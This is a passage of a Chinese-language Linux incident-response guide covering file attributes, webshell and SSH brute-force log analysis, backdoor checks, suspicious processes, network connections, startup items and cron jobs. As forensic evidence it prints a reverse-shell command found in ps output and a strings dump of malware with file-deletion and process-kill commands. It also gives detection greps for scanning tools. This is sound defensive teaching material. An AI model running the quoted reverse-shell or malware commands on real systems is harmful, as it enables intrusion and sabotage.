class=\"code\"><pre><span class=\"line\">https://x.threatbook.cn/</span><br><span class=\"line\">http://www.virscan.org</span><br><span class=\"line\">https://www.virustotal.com/</span><br><span class=\"line\">https://fireeye.ijinshan.com/</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x11-文件权限\"><a href=\"#0x11-文件权限\" class=\"headerlink\" title=\"0x11 文件权限\"></a>0x11 文件权限</h1><p>一般是使用chattr或者setfacl来设置权限。</p>\n<p>chattr可以修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录，常用参数如下：</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">i</span>：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。<span class=\"built_in\">i</span>参数对于文件 系统的安全设置有很大帮助。</span><br><span class=\"line\"></span><br><span class=\"line\">s：保密性地删除文件或目录，即硬盘空间被全部收回。</span><br><span class=\"line\"></span><br><span class=\"line\">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<p>设置/etc/resolv.conf为不可修改</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@vincent tmp]# chattr +i /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">[root@vincent tmp]# lsattr /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">----i--------e- /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">[root@vincent tmp]# echo \"\" &gt; /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">-bash: /etc/resolv.conf: 权限不够</span><br></pre></td></tr></table></figure>\n\n<p>可以使用lsattr查看文件权限</p>\n<p>setfacl其实是设置文件的访问控制列表，传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的，同时存在不灵活的问题， 例如目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)</p>\n<p>(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。</p>\n<p>(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。</p>\n<p>以上 2 种方法其实都不合适，为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。文件的所有者以及有CAP_FOWNER（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）的用户进程可以设置一个文件的acl。ACL 有两种，一种是access ACL，针对文件和目录设置访问控制列表。一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.</p>\n<p>getfacl获取文件权限</p>\n<p>setfacl设置Access ACL</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setfacl -m u:root:rwx &#123;file&#125;</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">取消ACL</span></span><br><span class=\"line\">setfacl -b &#123;file&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/\" target=\"_blank\" rel=\"noopener\">http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg</a></p>\n<p><a href=\"https://www.xsec.io/2018/8/31/emergency-response.html\" target=\"_blank\" rel=\"noopener\">https://www.xsec.io/2018/8/31/emergency-response.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/network/186071.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/network/186071.html</a></p>\n<p><a href=\"https://github.com/iamckn/backdoors\" target=\"_blank\" rel=\"noopener\">https://github.com/iamckn/backdoors</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"0x01-Web服务\"><a href=\"#0x01-Web服务\" class=\"headerlink\" title=\"0x01 Web服务\"></a>0x01 Web服务</h1><p>1) 检测最近创建的文件和上传目录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查找24小时内被修改的php文件</span></span><br><span class=\"line\">find ./ -mtime 0 -name \"*.php\"</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> n+1天前</span></span><br><span class=\"line\">find ./ -mtime +n -name \"*.php\" </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> n天内</span></span><br><span class=\"line\">find ./ -mtime -n -name \"*.php\"</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">具体还有 atime ctime</span></span><br></pre></td></tr></table></figure>\n\n<p>2) 与测试环境目录做对比</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -r &#123;生产dir&#125; &#123;测试dir&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3) 使用Webshell查杀工具</p>\n<p>Windows下D盾等，Linux下河马等。</p>\n<p>4) 创建Audit审计规则</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/audit/audit.rules</span><br><span class=\"line\">-a exclude,always -F msgtype=CONFIG_CHANGE</span><br><span class=\"line\">-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell</span><br></pre></td></tr></table></figure>\n\n<p>1）扫描特征</p>\n<p>通常入侵行为会伴随着踩点和扫描行为，那么可以查一下具有扫描行为的日志。</p>\n<p>例如使用AWVS扫描：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'acunetix' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>\n\n<p>例如使用sqlmap，但是没有使用–random-agent，UA中带有sqlmap</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'sqlmap' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>\n\n<p>2）孤立页面</p>\n<p>referer为 – 的php页面</p>\n<p>3）Content-Length</p>\n<p>攻击者打包回传，过滤Content-Length大于5M的日志</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk '&#123;if($10&gt;5000000)&#123;print $0&#125;&#125;' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>\n\n<p>需要注意这里如果发现疑似Webshell文件，先用stat记录下时间点，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</p>\n<h1 id=\"0x02-SSH服务\"><a href=\"#0x02-SSH服务\" class=\"headerlink\" title=\"0x02 SSH服务\"></a>0x02 SSH服务</h1><p>1)  系统账号情况</p>\n<ol>\n<li>查看特权用户</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F: '$3==0&#123;print $1&#125;' /etc/passwd</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看可以远程登录的帐号信息</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk '/\\$1|\\$6/&#123;print $1&#125;' /etc/shadow</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>sudo权限权限用户，非必须可删除<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\"</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>2）登录情况</p>\n<ol>\n<li>查看失败次数</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -o \"Failed password\" /var/log/secure|uniq -c</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>输出登录爆破的第一行和最后一行，确认爆破时间范围</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Failed password\" /var/log/secure|head -1</span><br><span class=\"line\">grep \"Failed password\" /var/log/secure|tail -1</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>定位爆破ip</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看爆破用户名字典</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Failed password\" /var/log/secure| perl -e 'while($_=&lt;&gt;)&#123; /for(.*?) from/; print \"$1\\n\";&#125;' |uniq -c|sort -nr</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>登录成功：</p>\n<p>登录成功的日期、用户名、IP</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Accepted \" /var/log/secure | awk '&#123;print $1,$2,$3,$9,$11&#125;'</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>​            登录成功的IP</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'Accepted' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>\n\n<p>​            或者last，它会读取位于/var/log/wtmp的文件。</p>\n<ol start=\"6\">\n<li>登录失败：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'Failed' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>\n\n<p>或者lastb，会读取位于/var/log/btmp的文件</p>\n<p>3）检查SSH后门方式：</p>\n<ol>\n<li>比对ssh的版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">ssh -V</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看ssh配置文件和/usr/sbin/sshd的时间</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">stat /etc/ssh/sshd_config</span><br><span class=\"line\">stat /usr/sbin/sshd</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>strings检查/usr/sbin/sshd，看是否有邮箱信息</li>\n</ol>\n<p>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings /usr/sbin/sshd</span><br></pre></td></tr></table></figure>\n\n<p>可以查看到邮箱信息。</p>\n<ol start=\"4\">\n<li>通过strace监控sshd进程读写文件的操作</li>\n</ol>\n<p>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps axu | grep sshd | grep -v grep</span><br><span class=\"line\"></span><br><span class=\"line\">root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd</span><br><span class=\"line\"></span><br><span class=\"line\">strace -o aa -ff -p 65530</span><br><span class=\"line\"></span><br><span class=\"line\">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class=\"line\"></span><br><span class=\"line\">aa.102586:open(\"/tmp/ilog\", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-进程\"><a href=\"#0x03-进程\" class=\"headerlink\" title=\"0x03 进程\"></a>0x03 进程</h1><p>检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程可能会隐藏。</p>\n<p>1）系统负载</p>\n<p>例如挖矿程序特征就是系统负载高。使用Top命令查看</p>\n<p>按照CPU排序：Shift+P</p>\n<p>按照MEM排序：Shift+M</p>\n<p>2）启动时间</p>\n<p>与前面找到的Webshell时间点比对。</p>\n<p>3）启动权限</p>\n<p>木马进程以mysql权限执行的，可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。</p>\n<p>4）父进程</p>\n<ol>\n<li>菜刀中反弹Bash</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\">ps -ef | grep <span class=\"string\">'/dev/tcp'</span> | grep -v grep</span></span><br><span class=\"line\"></span><br><span class=\"line\">apache   26641  1014  0 14:59 ?        00:00:00 sh -c /bin/sh -c \"cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &gt;&amp; /dev/tcp/192.168.192.144/2345 0&gt;&amp;1;echo [S];pwd;echo [E]\" 2&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\">ps -ef | grep 1014</span></span><br><span class=\"line\">apache    1014  1011  0 Sep19 ?        00:00:00 /usr/sbin/httpd</span><br></pre></td></tr></table></figure>\n\n<p>可以看到父进程为apache，就可以判断攻击者通过Web入侵。</p>\n<ol start=\"2\">\n<li>lsof -p pid：查看可疑进程打开的文件</li>\n</ol>\n<p>例如十字病毒，会修改ps和netstat显示的进程名称</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">udp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:<span class=\"number\">49937</span>               <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:*                               <span class=\"number\">131683</span>/ls -la</span><br><span class=\"line\"></span><br><span class=\"line\">udp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:<span class=\"number\">47584</span>               <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:*                               <span class=\"number\">116515</span>/ifconfig</span><br></pre></td></tr></table></figure>\n\n<p>很明显的异常，ls和ifconfig不会存在监听行为。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@DataNode105 admin]# lsof -p 131683</span><br><span class=\"line\"></span><br><span class=\"line\">COMMAND      PID USER   FD   TYPE    DEVICE SIZE/OFF     NODE NAME</span><br><span class=\"line\"></span><br><span class=\"line\">hahidjqzx 131683 root  cwd    DIR      8,98     4096 18087937 /root</span><br><span class=\"line\"></span><br><span class=\"line\">hahidjqzx 131683 root  rtd    DIR      8,98     4096        2 /</span><br><span class=\"line\"></span><br><span class=\"line\">hahidjqzx 131683 root  txt    REG      8,98   625622 24123895 /usr/bin/hahidjqzxs</span><br></pre></td></tr></table></figure>\n\n<p>可疑看到真正的可执行文件是/usr/bin/hahidjqzxs</p>\n<ol start=\"3\">\n<li>file：查看文件类型：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\"> file .zl</span></span><br><span class=\"line\"></span><br><span class=\"line\">zl: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>strings：显示二进制的文件中可读字符</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\"> strings .zl</span></span><br><span class=\"line\"></span><br><span class=\"line\">rm -f /boot/IptabLes ; rm -f /boot/.IptabLes ; rm -f /boot/IptabLex ; rm -f /boot/.IptabLex ; rm -f /usr</span><br><span class=\"line\"></span><br><span class=\"line\">/IptabLes ; rm -f /usr/.IptabLes ; rm -f /usr/IptabLex ; rm -f /usr/.IptabLex</span><br><span class=\"line\"></span><br><span class=\"line\">netstat -anp | grep \"IptabLes\" |awk '&#123;print $NF&#125;' |cut -d \"/\" -f 1 | xargs kill -9 &gt; /dev/null ;free -m</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> /dev/null</span></span><br><span class=\"line\"></span><br><span class=\"line\">netstat -anp | grep \"IptabLex\" |awk '&#123;print $NF&#125;' |cut -d \"/\" -f 1 | xargs kill -9 &gt; /dev/null ;free -m</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> /dev/null</span></span><br></pre></td></tr></table></figure>\n\n<p>例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址，就是明显的异常现象。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\"> strings /usr/bin/.sshd | egrep <span class=\"string\">'[1-9]&#123;1,3&#125;\\.[1-9]&#123;1,3&#125;\\.'</span></span></span><br><span class=\"line\">8.8.8.8</span><br><span class=\"line\">8.8.4.4</span><br><span class=\"line\">8.8.8.8</span><br><span class=\"line\">61.132.163.68</span><br><span class=\"line\">202.102.192.68</span><br><span class=\"line\">202.102.213.68</span><br><span class=\"line\">58.242.2.2</span><br><span class=\"line\">202.38.64.1</span><br><span class=\"line\">211.91.88.129</span><br><span class=\"line\">211.138.180.2</span><br><span class=\"line\">218.104.78.2</span><br><span class=\"line\">202.102.199.68</span><br><span class=\"line\">202.175.3.3</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x04-网络连接\"><a href=\"#0x04-网络连接\" class=\"headerlink\" title=\"0x04 网络连接\"></a>0x04 网络连接</h1><p>1）短连接</p>\n<p>短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p>\n<p>例：编写脚本捕捉pid和源文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\">ip=118.184.15.40</span><br><span class=\"line\">i=1</span><br><span class=\"line\">while :</span><br><span class=\"line\">do</span><br><span class=\"line\">   tmp=`netstat -anplt|grep $ip|awk -F '[/]' '&#123;print $1&#125;'|awk '&#123;print $7&#125;'`</span><br><span class=\"line\"><span class=\"meta\">   #</span><span class=\"bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$tmp</span></span></span><br><span class=\"line\">   if test -z \"$tmp\"</span><br><span class=\"line\">   then</span><br><span class=\"line\">       ((i=i+1)) </span><br><span class=\"line\">   else</span><br><span class=\"line\">       for pid in $tmp; do</span><br><span class=\"line\">           echo \"PID: \"$&#123;pid&#125;</span><br><span class=\"line\">          result=`ls -lh /proc/$pid|grep exe`</span><br><span class=\"line\">          echo \"Process: \"$&#123;result&#125;</span><br><span class=\"line\">          kill -9 $pid</span><br><span class=\"line\">       done</span><br><span class=\"line\">       break</span><br><span class=\"line\">   fi </span><br><span class=\"line\">done</span><br><span class=\"line\">echo \"Total number of times: \"$&#123;i&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2）</p>\n<p>需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接可能会被隐藏。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antlp | grep ESTABLISHED</span><br></pre></td></tr></table></figure>\n\n<p>查看已经建立的网络连接，例如反弹bash</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antlp | grep EST | grep bash</span><br></pre></td></tr></table></figure>\n\n<p>检查可以监听端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antlp | grep LISTEN</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x05-敏感目录\"><a href=\"#0x05-敏感目录\" class=\"headerlink\" title=\"0x05 敏感目录\"></a>0x05 敏感目录</h1><p>/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行</p>\n<h1 id=\"0x06-history\"><a href=\"#0x06-history\" class=\"headerlink\" title=\"0x06 history\"></a>0x06 history</h1><p>默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。</p>\n<h1 id=\"0x07-开机启动\"><a href=\"#0x07-开机启动\" class=\"headerlink\" title=\"0x07 开机启动\"></a>0x07 开机启动</h1><p>1）CentOS 5系统</p>\n<ol>\n<li>/etc/inittab<br>该文件是可以运行process</li>\n<li>/etc/rc.d/rc.sysinit</li>\n<li>/etc/rc.d/init.d</li>\n<li>/etc/rc.d/rc.local</li>\n</ol>\n<p>2） CentOS 6 </p>\n<ol>\n<li>/etc/init/*.conf</li>\n<li>/etc/rc.d/rc.sysinit</li>\n<li>/etc/rc.d/init.d</li>\n<li>/etc/rc.d/rc.local</li>\n</ol>\n<p>3） CentOS 6 </p>\n<ol>\n<li><p>排查修改的service</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find /usr/lib/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5</span><br><span class=\"line\">find /etc/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>/etc/rc.d/init.d</p>\n</li>\n<li><p>/etc/rc.d/rc.local<br>不过需要看/etc/rc.d/rc.local是否有x权限。</p>\n</li>\n</ol>\n<h1 id=\"0x08-定时任务\"><a href=\"#0x08-定时任务\" class=\"headerlink\" title=\"0x08 定时任务\"></a>0x08 定时任务</h1><p>一般常用的定时任务crontab -l是用户级别的，保存在/var/spool/cron/{user}，每个用户都可以通过crontab -e编辑自己的定时任务列表。<br>而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。<br>另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。</p>\n<h1 id=\"0x09-Rootkit\"><a href=\"#0x09-Rootkit\" class=\"headerlink\" title=\"0x09  Rootkit\"></a>0x09  